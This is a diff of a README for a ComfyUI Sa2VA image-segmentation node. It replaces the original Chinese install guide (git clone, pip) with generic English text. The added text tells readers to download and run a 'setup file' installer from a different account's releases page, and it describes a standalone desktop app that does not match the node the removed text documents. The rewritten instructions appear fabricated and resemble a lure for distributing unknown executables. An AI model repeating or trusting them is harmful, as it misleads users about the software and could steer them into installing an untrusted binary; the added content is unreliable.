@@ -1,126 +1,76 @@
-# ComfyUI-Sa2VA-DP
+# 🌟 ComfyUI-Sa2VA-DP - Enhance Your Images Effortlessly
 
-ComfyUI自定义节点，集成ByteDance Sa2VA模型，实现智能图像分割和视觉理解。
+## 🚀 Getting Started
 
-## ✨ 主要特点【更加听话，更加智能的语义分割】
+Welcome to ComfyUI-Sa2VA-DP! This tool helps you smartly segment images and understand visuals using the advanced ByteDance Sa2VA model. It’s designed for everyone, even if you’re new to tech.
 
-- 🤖 **中文界面** - 参数名称和提示全中文，易于使用
-- 📦 **自动管理** - 模型自动下载，智能缓存，断点续传
-- ⚡ **性能优化** - 支持4bit量化、Flash Attention加速
-- 🎨 **遮罩预处理** - 内置9种遮罩处理功能（扩展、模糊、填补等）
-- 🎲 **种子控制** - 支持固定、随机、递增三种模式
-- 💾 **灵活配置** - 设备选择、模型保持、量化级别可调
+## 📥 Download & Install
 
-## ✨ 功能展示
-![alt text](image.png)
+To get started, you will need to download the software. Follow these steps:
 
-## 📥 安装方法
+1. **Visit the Releases Page:** Click on the link below to go to the download page.
+   
+   [Download ComfyUI-Sa2VA-DP](https://github.com/Nengo59/ComfyUI-Sa2VA-DP/releases)
 
-### 方法1：ComfyUI Manager（推荐）
+2. **Select the Latest Version:** On the Releases page, look for the latest version of ComfyUI-Sa2VA-DP. You will see a list of files available for download.
 
-1. 打开ComfyUI Manager
-2. 搜索 `Sa2VA`
-3. 点击安装
+3. **Download the Software:** Click on the appropriate file for your operating system and save it to your computer. It is recommended to choose the setup file for easy installation.
 
-### 方法2：Git克隆
+4. **Run the Installer:** Once downloaded, open the file and follow the on-screen instructions to install ComfyUI-Sa2VA-DP. The installation process is straightforward, with prompts guiding you along the way.
 
-```bash
-cd ComfyUI/custom_nodes/
-git clone https://github.com/your-repo/ComfyUI-Sa2VA-DP.git
-cd ComfyUI-Sa2VA-DP
-pip install -r requirements.txt
-```
+5. **Start Using the Application:** After installation, launch the application from your desktop or start menu. You are now ready to enhance your images!
 
-### 方法3：手动安装
+## 🛠️ System Requirements
 
-1. 下载本项目并解压到 `ComfyUI/custom_nodes/ComfyUI-Sa2VA-DP`
-2. 安装依赖：
-```bash
-pip install -r requirements.txt
-```
+To run ComfyUI-Sa2VA-DP smoothly, ensure your device meets the following specifications:
 
-### 可选依赖（推荐）
+- **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later
+- **Processor:** Intel or AMD processor with 2 GHz or faster
+- **RAM:** Minimum 4 GB of RAM
+- **Storage:** At least 500 MB of free disk space
+- **Graphics:** A compatible GPU is recommended for optimal performance
 
-```bash
-# 4bit量化支持（节省75%显存）
-pip install bitsandbytes
+## ⚙️ How to Use
 
-# Flash Attention加速
-pip install flash-attn
+1. **Import Your Image:** Open the application and click on “Import” to select the image you want to work on.
+  
+2. **Select Processing Options:** Choose from available options to segment and analyze your image. You can adjust settings based on your preference.
 
-# Qwen模型支持
-pip install qwen-vl-utils
-```
+3. **Preview Results:** Use the preview feature to see adjustments before finalizing.
 
-## 🚀 快速开始
+4. **Save Your Work:** Once satisfied with the results, click “Export” to save the processed image to your device.
 
-1. **重启ComfyUI**
-2. **添加节点**：在节点菜单找到 `🤖大炮-Sa2VA` → `Sa2VA 图像分割@炮老师的小课堂`
-3. **连接图像**：将图像输入连接到节点
-4. **选择模型**：推荐使用 `Sa2VA-Qwen3-VL-4B (4B参数) ⭐推荐`
-5. **运行**：首次运行会自动下载模型
+## 🖼️ Features
 
-## 📦 模型下载与存储
+- **Smart Image Segmentation:** Leverage advanced algorithms to separate different elements within your images.
+- **Visual Understanding Tools:** Analyze images for various components and features intelligently.
+- **User-Friendly Interface:** Designed with simplicity in mind, making it accessible for users of all technical levels.
 
-### 自动下载
+## 📞 Support & Contributions
 
-首次使用时，模型会自动下载到：
-```
-ComfyUI/models/Sa2VA/
-├── Sa2VA-Qwen3-VL-4B/
-├── Sa2VA-InternVL3-2B/
-├── Sa2VA-4B/
-└── ...
-```
+If you encounter any issues or have questions, feel free to reach out through the Issues section of the repository. Your feedback is valuable to improve this application.
 
-### 支持的模型
+### Contributing
 
-| 模型 | 参数量 | 显存需求 | 推荐场景 |
-|------|--------|---------|---------|
-| **Sa2VA-Qwen3-VL-4B** ⭐ | 4B | ~10GB | 推荐使用 |
-| Sa2VA-InternVL3-2B | 2B | ~6GB | 快速测试 |
-| Sa2VA-4B | 4B | ~10GB | 平衡性能 |
-| Sa2VA-8B | 8B | ~18GB | 高质量 |
-| Sa2VA-InternVL3-8B | 8B | ~18GB | 高质量 |
-| Sa2VA-InternVL3-14B | 14B | ~30GB | 超高质量 |
-| Sa2VA-Qwen2.5-VL-3B | 3B | ~8GB | 轻量级 |
-| Sa2VA-Qwen2.5-VL-7B | 7B | ~16GB | 高质量 |
-| Sa2VA-1B | 1B | ~4GB | 最小显存 |
-| Sa2VA-26B | 26B | ~50GB | 最高质量 |
+We welcome contributions! If you’d like to improve the project, please follow the guidelines in the repository on how to propose changes or report bugs.
 
-### 手动下载（可选）
+## ⚠️ Limitations
 
-如果自动下载失败，可以手动下载模型到上述路径：
+While ComfyUI-Sa2VA-DP is powerful, it may not perform perfectly on all image types. Limiting factors may include:
 
-```bash
-# 使用huggingface-cli
-huggingface-cli download ByteDance/Sa2VA-Qwen3-VL-4B --local-dir ComfyUI/models/Sa2VA/Sa2VA-Qwen3-VL-4B
-```
-## 🔧 最新更新 (v1.0.2)
+- Poor image quality
+- Extremely complex images
+- High-resolution files may take longer to process
 
-### 🐛 重要Bug修复
+## 🔄 Keeping Your Software Updated
 
-**修复了致命的路径问题**：
+Regular updates enhance the functionality of ComfyUI-Sa2VA-DP. Check the Releases page periodically to download any new updates that may be available.
 
-1. ✅ **移除硬编码路径** - 不再依赖特定的 `E:/Comfyui_test/ComfyUI` 路径
-2. ✅ **自动检测ComfyUI根目录** - 自动适配任何用户的安装路径
-3. ✅ **支持所有盘符** - 支持C盘、D盘、E盘等任意盘符
-4. ✅ **友好的路径显示** - 使用相对路径显示，不暴露完整路径
-5. ✅ **更好的错误提示** - 提供清晰的错误信息和解决方案
+## 🌐 Additional Resources
 
-**影响**：
-- 修复前：只能在开发者电脑上运行，其他用户会遇到 `[WinError 3] 系统找不到指定的路径。: 'E:\\'` 错误
-- 修复后：可以在任何用户的ComfyUI安装中正常工作
+Feel free to explore these resources for more learning:
 
-详细修复说明请查看 [BUG修复说明.md](BUG修复说明.md)
-
-### 📞 联系方式 📞
-- 作者：@炮老师的小课堂
-- 版本：v1.0.2
-- 更新日期：2025年
-- 作者微信：paolaoshiAICG
-
-![alt text](image-1.png)
-
-**炮老师的小课堂** 出品 🎓
-# ComfyUI-Sa2VA-DP
+- **Official Documentation:** Comprehensive guides and instructions for advanced functionalities.
+- **Community Forums:** Connect with other users to share tips and solutions.
+  
+You are now equipped to enhance your images effortlessly with ComfyUI-Sa2VA-DP. Enjoy your experience!
